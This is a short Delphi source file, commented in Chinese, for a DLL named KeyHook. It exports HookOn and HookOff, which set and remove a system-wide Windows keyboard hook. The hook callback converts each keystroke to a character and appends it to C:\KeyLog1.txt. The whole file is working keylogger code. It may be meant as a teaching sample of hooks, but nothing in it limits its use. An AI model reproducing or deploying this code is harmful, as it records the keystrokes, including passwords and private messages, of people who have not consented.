library KeyHook;

uses Windows;

var KeyboardHook: HHOOK;

 // 键盘钩子回调函数
function KeyboardProc(nCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT; stdcall;
var
  Kbs: TKeyboardState;
  HFile: THandle;
  WChar: array[0..1] of Char;
  WSize: DWORD;
begin
 // 消息会被移出队列, 并且, 本次调用是因为键盘按下
  if (nCode = HC_ACTION) and (lParam and $80000000 = 0) then
  begin
   // 取键盘状态
    GetKeyboardState(Kbs);

   // 转换成字符
    if ToAscii(wParam, (lParam shr 16) and $FF, Kbs, WChar, 0) = 1 then
    begin
     // 打开文件
      HFile := CreateFile('C:\KeyLog1.txt', GENERIC_WRITE,
        FILE_SHARE_READ or FILE_SHARE_WRITE, nil, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

     // 添加字符
      SetFilePointer(HFile, 0, nil, FILE_END);
      WriteFile(HFile, WChar[0], 1, WSize, nil);

     // 回车补#10
      if (WChar[0] = #13) then
      begin
        WChar[0] := #10;
        WriteFile(HFile, WChar[0] , 1, WSize, nil);
      end;

     // 关闭保存
      CloseHandle(HFile);
    end;
  end;

 // 传给下一个钩子处理, 并且返回它的返回值
  Result := CallNextHookEx(KeyboardHook, nCode, wParam, lParam);
end;

 // 挂键盘钩子
procedure HookOn();
begin
  KeyboardHook := SetWindowsHookEx(WH_KEYBOARD, @KeyboardProc, HInstance, 0);
end;

 // 脱键盘钩子
procedure HookOff();
begin
  UnHookWindowsHookEx(KeyboardHook);
end;

exports
  HookOn, HookOff;

begin
end.

